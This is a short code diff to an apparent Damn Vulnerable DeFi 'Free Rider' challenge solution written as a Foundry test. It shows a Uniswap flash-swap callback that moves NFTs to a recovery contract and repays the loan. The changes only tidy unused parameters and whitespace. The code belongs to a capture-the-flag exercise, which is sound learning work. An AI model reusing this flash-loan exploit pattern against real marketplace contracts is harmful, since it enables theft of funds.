@@ -130,10 +130,10 @@ contract FreeRiderChallenge is Test, IERC721Receiver {
     }
 
      function uniswapV2Call(
-        address sender,
+        address,
         uint amount0,
-        uint amount1,
-        bytes calldata data
+        uint ,
+        bytes calldata
     ) external {
 
         uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
@@ -146,7 +146,7 @@ contract FreeRiderChallenge is Test, IERC721Receiver {
         for (uint i = 0; i < ids.length; i++) {
             nft.safeTransferFrom(address(this),address(recoveryManager), i, abi.encodePacked(bytes32(uint256(uint160(address(player))))));
         }
-        
+
         uint amountRequired = (amount0 * 1000) / 997 + 1;
         weth.deposit{value: amountRequired}();
         assert(weth.transfer(msg.sender, amountRequired)); // return WETH to V2 pair
@@ -154,9 +154,9 @@ contract FreeRiderChallenge is Test, IERC721Receiver {
       function onERC721Received(
         address,
         address,
-        uint256 _tokenId,
-        bytes memory _data
-    ) external returns (bytes4) {
+        uint256 ,
+        bytes memory 
+    ) external pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
 
